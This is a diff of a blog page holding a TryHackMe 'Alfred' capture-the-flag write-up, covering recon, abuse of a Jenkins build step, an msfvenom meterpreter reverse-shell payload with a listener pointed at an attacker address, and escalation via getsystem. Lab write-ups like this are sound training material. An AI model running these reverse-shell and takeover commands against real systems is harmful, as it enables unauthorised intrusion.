@@ -6,7 +6,7 @@
 <title>THM: Alfred</title>
 <meta name="author" content="Lamprinos Chatziioannou" />
 <meta name="generator" content="Org Mode" />
-<link rel="preconnect" href="https://fonts.googleapis.com"> <link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap" rel="stylesheet"> <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed&display=swap" rel="stylesheet"> <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono&display=swap" rel="stylesheet"> <script src="https://cdn.jsdelivr.net/gh/oyvindstegard/ox-tagfilter-js/ox-tagfilter.js"></script> <link rel="stylesheet" href="/src/rougier.min.css" /> <script src="/src/copy-pre.min.js"></script> <script src="/src/theme-switcher.min.js" defer></script> <link rel="icon" type="image/x-icon" href="/src/favicon.ico"> <meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Google tag (gtag.js) --> <script async src="https://www.googletagmanager.com/gtag/js?id=G-55X4GXWBKS"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-55X4GXWBKS'); </script><script src="https://kit.fontawesome.com/78d5a086dd.js" crossorigin="anonymous"></script>
+<link rel="preconnect" href="https://fonts.googleapis.com"> <link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap" rel="stylesheet"> <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed&display=swap" rel="stylesheet"> <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono&display=swap" rel="stylesheet"><script src="/src/copy-pre.min.js"></script><script src="/src/theme-switcher.min.js" defer></script><link rel="stylesheet" href="/src/rougier.min.css" /><link rel="icon" type="image/x-icon" href="/src/favicon.ico"><script src="https://kit.fontawesome.com/78d5a086dd.js" crossorigin="anonymous"></script><meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0">
 </head>
 <body>
 <div id="preamble" class="status">
@@ -18,41 +18,41 @@
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#orgbf0664d">Intro</a></li>
-<li><a href="#orgcaf63c6">Reconnaissance</a>
+<li><a href="#org0b02d66">Intro</a></li>
+<li><a href="#orgb29f8eb">Reconnaissance</a>
 <ul>
-<li><a href="#org011c9bd">Web Analysis: Port 80 Web Server</a></li>
-<li><a href="#orgc631a71">Web Analysis: Port 8080 Web Server</a></li>
+<li><a href="#orgcbe1fd2">Web Analysis: Port 80 Web Server</a></li>
+<li><a href="#orga42623b">Web Analysis: Port 8080 Web Server</a></li>
 </ul>
 </li>
-<li><a href="#orgbdb643d">Using Alfred</a></li>
-<li><a href="#orgbb81d57">Upgrading our shell</a>
+<li><a href="#org4574f95">Using Alfred</a></li>
+<li><a href="#orgb5f33ba">Upgrading our shell</a>
 <ul>
-<li><a href="#orga8a4347">MSFvenom</a></li>
-<li><a href="#org4f583c6">Meterpreter listener</a></li>
-<li><a href="#orge2b0804">Downloading File</a></li>
+<li><a href="#orgd8ed337">MSFvenom</a></li>
+<li><a href="#org72832f4">Meterpreter listener</a></li>
+<li><a href="#org9ce1850">Downloading File</a></li>
 </ul>
 </li>
-<li><a href="#org3c11ea6">Privilege escalation</a></li>
+<li><a href="#org8b31ae7">Privilege escalation</a></li>
 </ul>
 </div>
 </div>
-<div id="outline-container-orgbf0664d" class="outline-2">
-<h2 id="orgbf0664d"><a href="#orgbf0664d">Intro</a></h2>
-<div class="outline-text-2" id="text-orgbf0664d">
+<div id="outline-container-org0b02d66" class="outline-2">
+<h2 id="org0b02d66"><a href="#org0b02d66">Intro</a></h2>
+<div class="outline-text-2" id="text-org0b02d66">
 <p>
 This time, other than just populating <code>/etc/hosts</code> with <code>alfred.thm</code>, I
 also ran the following, to help me use my <i>standardized</i> notes.
 </p>
 <div class="org-src-container">
-<pre class="src src-bash" id="orgc92d9ca"><span class="org-builtin">echo</span> <span class="org-string">"export IP=alfred.thm"</span> &gt;&gt; ~/.bashrc
+<pre class="src src-bash" id="org2029880"><span class="org-builtin">echo</span> <span class="org-string">"export IP=alfred.thm"</span> &gt;&gt; ~/.bashrc
 </pre>
 </div>
 </div>
 </div>
-<div id="outline-container-orgcaf63c6" class="outline-2">
-<h2 id="orgcaf63c6"><a href="#orgcaf63c6">Reconnaissance</a></h2>
-<div class="outline-text-2" id="text-orgcaf63c6">
+<div id="outline-container-orgb29f8eb" class="outline-2">
+<h2 id="orgb29f8eb"><a href="#orgb29f8eb">Reconnaissance</a></h2>
+<div class="outline-text-2" id="text-orgb29f8eb">
 <p>
 Simple nmap scan to find our open tcp ports:
 </p>
@@ -70,9 +70,9 @@ And this gives us:
 <li class="off"><code>[&#xa0;]</code> 8080 (HTTP)</li>
 </ul>
 </div>
-<div id="outline-container-org011c9bd" class="outline-3">
-<h3 id="org011c9bd"><a href="#org011c9bd">Web Analysis: Port 80 Web Server</a></h3>
-<div class="outline-text-3" id="text-org011c9bd">
+<div id="outline-container-orgcbe1fd2" class="outline-3">
+<h3 id="orgcbe1fd2"><a href="#orgcbe1fd2">Web Analysis: Port 80 Web Server</a></h3>
+<div class="outline-text-3" id="text-orgcbe1fd2">
 <ul class="org-ul">
 <li>Minimal starting web page, started gobuster while trying the usual
 spots. Nothing of interest came up</li>
@@ -80,14 +80,14 @@ spots. Nothing of interest came up</li>
 </ul>
 
 <div class="org-src-container">
-<pre class="src src-bash" id="org869ecbe">gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://$<span class="org-variable-name">IP</span> -o gobuster.big
+<pre class="src src-bash" id="orgc0a7b3e">gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://$<span class="org-variable-name">IP</span> -o gobuster.big
 </pre>
 </div>
 </div>
 </div>
-<div id="outline-container-orgc631a71" class="outline-3">
-<h3 id="orgc631a71"><a href="#orgc631a71">Web Analysis: Port 8080 Web Server</a></h3>
-<div class="outline-text-3" id="text-orgc631a71">
+<div id="outline-container-orga42623b" class="outline-3">
+<h3 id="orga42623b"><a href="#orga42623b">Web Analysis: Port 8080 Web Server</a></h3>
+<div class="outline-text-3" id="text-orga42623b">
 <ul class="org-ul">
 <li>Jenkins entry portal</li>
 <li>Robots.txt disallows everything on root</li>
@@ -103,7 +103,7 @@ spots. Nothing of interest came up</li>
 </ul></li>
 </ul>
 
-<div id="orgf35f404" class="figure">
+<div id="org7f01a28" class="figure">
 <p><img src="images/Reconnaissance/20231130_145031_screenshot.png" alt="20231130_145031_screenshot.png">
 </p>
 <p><span class="figure-number">Figure 1: </span>Jenkins Entry portal</p>
@@ -121,9 +121,9 @@ another, better way to go.
 </div>
 </div>
 </div>
-<div id="outline-container-orgbdb643d" class="outline-2">
-<h2 id="orgbdb643d"><a href="#orgbdb643d">Using Alfred</a></h2>
-<div class="outline-text-2" id="text-orgbdb643d">
+<div id="outline-container-org4574f95" class="outline-2">
+<h2 id="org4574f95"><a href="#org4574f95">Using Alfred</a></h2>
+<div class="outline-text-2" id="text-org4574f95">
 <p>
 Since I already knew that Alfred is a CI/CD server, even though I had
 never worked on it, it was relatively simple:
@@ -135,7 +135,7 @@ that action was <b>directly</b> modifiable.
 </p></li>
 </ul>
 
-<div id="org26b366b" class="figure">
+<div id="orgd0008ae" class="figure">
 <p><img src="images/Using_Alfred/20231201_231517_screenshot.png" alt="20231201_231517_screenshot.png">
 </p>
 </div>
@@ -155,43 +155,43 @@ However, that did not stop me from getting the flag. Unlikeable is not unusable.
 </p>
 </div>
 </div>
-<div id="outline-container-orgbb81d57" class="outline-2">
-<h2 id="orgbb81d57"><a href="#orgbb81d57">Upgrading our shell</a></h2>
-<div class="outline-text-2" id="text-orgbb81d57">
+<div id="outline-container-orgb5f33ba" class="outline-2">
+<h2 id="orgb5f33ba"><a href="#orgb5f33ba">Upgrading our shell</a></h2>
+<div class="outline-text-2" id="text-orgb5f33ba">
 <p>
 The room then suggests that we get a meterpreter shell, which I again,
 trying to avoid the <i>walkthrough</i> character of it, did my way.
 </p>
 </div>
-<div id="outline-container-orga8a4347" class="outline-3">
-<h3 id="orga8a4347"><a href="#orga8a4347">MSFvenom</a></h3>
-<div class="outline-text-3" id="text-orga8a4347">
+<div id="outline-container-orgd8ed337" class="outline-3">
+<h3 id="orgd8ed337"><a href="#orgd8ed337">MSFvenom</a></h3>
+<div class="outline-text-3" id="text-orgd8ed337">
 <p>
 Just a simple meterpreter reverse shell:
 </p>
 
 <div class="org-src-container">
-<pre class="src src-cmd" id="org6bbb5db">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.67.161 LPORT=6969 -f exe -o reverse.exe
+<pre class="src src-cmd" id="org4810839">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.67.161 LPORT=6969 -f exe -o reverse.exe
 </pre>
 </div>
 </div>
 </div>
-<div id="outline-container-org4f583c6" class="outline-3">
-<h3 id="org4f583c6"><a href="#org4f583c6">Meterpreter listener</a></h3>
-<div class="outline-text-3" id="text-org4f583c6">
+<div id="outline-container-org72832f4" class="outline-3">
+<h3 id="org72832f4"><a href="#org72832f4">Meterpreter listener</a></h3>
+<div class="outline-text-3" id="text-org72832f4">
 <p>
 Get the listener up and running
 </p>
 
 <div class="org-src-container">
-<pre class="src src-cmd" id="org4b35e50">msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.67.161; set lport 6969; exploit"
+<pre class="src src-cmd" id="orgd689ac3">msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.67.161; set lport 6969; exploit"
 </pre>
 </div>
 </div>
 </div>
-<div id="outline-container-orge2b0804" class="outline-3">
-<h3 id="orge2b0804"><a href="#orge2b0804">Downloading File</a></h3>
-<div class="outline-text-3" id="text-orge2b0804">
+<div id="outline-container-org9ce1850" class="outline-3">
+<h3 id="org9ce1850"><a href="#org9ce1850">Downloading File</a></h3>
+<div class="outline-text-3" id="text-org9ce1850">
 <p>
 My experience with windows is quite limited and that&rsquo;s why I had to go
 into a little bit more research to get this over with :(
@@ -216,9 +216,9 @@ procedure in Linux.
 </div>
 </div>
 </div>
-<div id="outline-container-org3c11ea6" class="outline-2">
-<h2 id="org3c11ea6"><a href="#org3c11ea6">Privilege escalation</a></h2>
-<div class="outline-text-2" id="text-org3c11ea6">
+<div id="outline-container-org8b31ae7" class="outline-2">
+<h2 id="org8b31ae7"><a href="#org8b31ae7">Privilege escalation</a></h2>
+<div class="outline-text-2" id="text-org8b31ae7">
 <p>
 Sadly <code>getsystem</code> works perfectly, and we get <code>NT AUTHORITY\SYSTEM</code>,
 without it being necessary to do anything.
@@ -227,7 +227,7 @@ without it being necessary to do anything.
 </div>
 </div>
 <div id="postamble" class="status">
-<script src="https://giscus.app/client.js" data-repo="chatziiola/chatziiola.github.io" data-repo-id=x\"R_kgDOGq8p0g" data-category="Announcements" data-category-id="DIC_kwDOGq8p0s4COSFW" data-mapping="pathname" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="bottom" data-theme="light" data-lang="en" data-loading="lazy" crossorigin="anonymous" async> </script> <p class=\"date footer\"> Originally created on 2023-11-30 Thu 14:34</p><p class="footer"> Made with Emacs and Org.<br>CSS theme based on the one developed by <a href="https://github.com/rougier">@rougier</a>.<br> <a href="https://github.com/chatziiola"> <i class="fa-brands fa-github"></i> </a> <a href="https://www.linkedin.com/in/chatziiola"> <i class="fa-brands fa-linkedin"></i> </a> <a href="/posts/rss.xml"> <i class="fa-solid fa-rss"></i> </a> </p>
+<script src="https://giscus.app/client.js" data-repo="chatziiola/chatziiola.github.io" data-repo-id=x\"R_kgDOGq8p0g" data-category="Announcements" data-category-id="DIC_kwDOGq8p0s4COSFW" data-mapping="pathname" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="bottom" data-theme="light" data-lang="en" data-loading="lazy" crossorigin="anonymous" async></script><p class="date footer"> Originally created on 2023-11-30 Thu 14:34</p><p class="footer footer-text">Made with Emacs and Org.<br>CSS theme based on the one developed by <a href="https://github.com/rougier">@rougier</a>.<br>© 2025 Lamprinos Chatziioannou. <a href="https://github.com/chatziiola/chatziiola.github.io/blob/main/LICENSE">Content may be shared with attribution</a>.</p><p class="footer footer-social" ><a href="https://github.com/chatziiola"><i class="fa-brands fa-github"></i></a><a href="https://www.linkedin.com/in/chatziiola"> <i class="fa-brands fa-linkedin"></i></a><a href="/posts/rss.xml"> <i class="fa-solid fa-rss"></i> </a></p>
 </div>
 </body>
 </html>
